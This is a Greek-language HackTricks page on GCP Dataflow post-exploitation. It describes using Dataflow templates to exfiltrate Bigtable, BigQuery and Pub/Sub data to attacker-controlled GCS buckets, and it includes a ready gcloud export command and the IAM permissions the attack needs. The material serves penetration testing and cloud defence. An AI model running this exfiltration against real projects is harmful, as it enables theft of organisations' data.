# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

Για περισσότερες πληροφορίες σχετικά με το Dataflow δείτε:

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### Χρήση του Dataflow για exfiltrate δεδομένων από άλλες υπηρεσίες

**Δικαιώματα:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs` (σε SA με πρόσβαση στην πηγή και στον προορισμό)

Με δικαιώματα δημιουργίας job στο Dataflow, μπορείτε να χρησιμοποιήσετε GCP Dataflow templates για να εξάγετε δεδομένα από Bigtable, BigQuery, Pub/Sub και άλλες υπηρεσίες σε attacker-controlled GCS buckets. Αυτή είναι μια ισχυρή τεχνική post-exploitation όταν έχετε αποκτήσει πρόσβαση στο Dataflow — για παράδειγμα μέσω του [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) privilege escalation (pipeline takeover via bucket write).

> [!NOTE]
> Χρειάζεστε `iam.serviceAccounts.actAs` πάνω σε έναν service account με επαρκή δικαιώματα για ανάγνωση της πηγής και εγγραφή στον προορισμό. Εξ ορισμού, χρησιμοποιείται ο Compute Engine default SA αν δεν καθοριστεί άλλος.

#### Bigtable to GCS

Δείτε [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md#dump-rows-to-your-bucket) — "Dump rows to your bucket" για το πλήρες μοτίβο. Templates: `Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>Εξαγωγή Bigtable σε attacker-controlled bucket</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery σε GCS

Υπάρχουν Dataflow templates για την εξαγωγή δεδομένων από BigQuery. Χρησιμοποιήστε το κατάλληλο template για τη στοχευόμενη μορφή (JSON, Avro, κ.λπ.) και ορίστε την έξοδο στο bucket σας.

#### Pub/Sub και streaming πηγές

Οι streaming pipelines μπορούν να διαβάζουν από Pub/Sub (ή άλλες πηγές) και να γράφουν σε GCS. Εκκινήστε μια job με ένα template που διαβάζει από την στοχευμένη Pub/Sub subscription και γράφει στο ελεγχόμενο bucket σας.

## Αναφορές

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
